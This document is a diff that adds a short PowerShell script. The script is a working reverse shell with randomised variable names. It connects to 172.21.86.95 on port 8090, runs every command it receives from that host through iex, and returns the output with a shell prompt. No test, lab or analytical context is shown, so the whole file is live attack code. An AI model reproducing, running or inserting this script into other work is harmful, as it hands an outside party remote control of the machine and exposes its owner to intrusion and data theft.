@@ -1,0 +1,14 @@
+ $mEzk8EBqll = New-Object System.Net.Sockets.TCPClient("172.21.86.95", 8090)
+    $OVJTqRvTwkew2T = $mEzk8EBqll.GetStream()
+    [byte[]]$ecNBhj6H20iBRQ0c = 0..65535 | % { 0 }
+
+    while (($Hp8axDuwNyFBzi = $OVJTqRvTwkew2T.Read($ecNBhj6H20iBRQ0c, 0, $ecNBhj6H20iBRQ0c.Length)) -ne 0) {
+        $4PXdKeM8 = (New-Object System.Text.ASCIIEncoding).GetString($ecNBhj6H20iBRQ0c, 0, $Hp8axDuwNyFBzi)
+        $QdIpFSyL3aY = (iex $4PXdKeM8 2>&1 | Out-String)
+        $ok8Y4ZhFOL = $QdIpFSyL3aY + "PS " + (pwd).Path + ">"
+        $ZNCnkYgP54dqh = ([text.encoding]::ASCII).GetBytes($ok8Y4ZhFOL)
+        $OVJTqRvTwkew2T.Write($ZNCnkYgP54dqh, 0, $ZNCnkYgP54dqh.Length)
+        $OVJTqRvTwkew2T.Flush()
+    }
+
+    $mEzk8EBqll.Close()
